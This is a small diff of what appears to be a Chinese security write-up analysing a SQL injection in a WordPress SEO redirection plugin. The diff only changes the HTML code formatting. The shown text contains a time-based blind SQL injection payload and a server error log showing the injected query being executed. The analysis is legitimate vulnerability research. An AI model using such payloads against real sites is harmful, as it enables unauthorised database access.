@@ -37,9 +37,9 @@ WordPress版本：4.3.6
 
 为了更好的分析这个漏洞产生的过程，我插入了一条可以触发数据库错误的语句<code>') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'</code>(这里多了一个<code>'</code>),借助后台日志，我尝试着找到了这段注入执行的语句。
 
-<code>
-[Thu Dec 22 06:55:20.702722 2016] [:error] [pid 187] [client 10.10.79.136:43543] WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'/' regexp regex ) order by LENGTH(regex) desc \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82
-</code>
+<pre><code>
+[Thu Dec 22 06:55:20.702722 2016] [:error] [pid 187] [client 10.10.79.136:43543]WordPress\xe6\x95\xb0\xe6\x8d\xae\xe5\xba\x93\xe6\x9f\xa5\xe8\xaf\xa2 select * from wp_WP_SEO_Redirection where enabled=1 and cat='link' and blog='1' and regex<>'' and ('/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'' regexp regex or '/?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'='SQL'/' regexp regex ) order by LENGTH(regex) desc \xe6\x97\xb6\xe5\x8f\x91\xe7\x94\x9fYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?p=1') AND (SELECT * FROM (SELECT(SLEEP(5-(IF('a'='a',0,5)))))abc) AND ('SQL'' at line 1\xe9\x94\x99\xe8\xaf\xaf\xef\xbc\x8c\xe8\xbf\x99\xe6\x98\xaf\xe7\x94\xb1require('wp-blog-header.php'), wp, WP->main, do_action_ref_array, call_user_func_array, SR_redirect_manager::redirect\xe6\x9f\xa5\xe8\xaf\xa2\xe7\x9a\x84\xe3\x80\x82
+</code></pre>
 
 执行的语句是这样的：
 
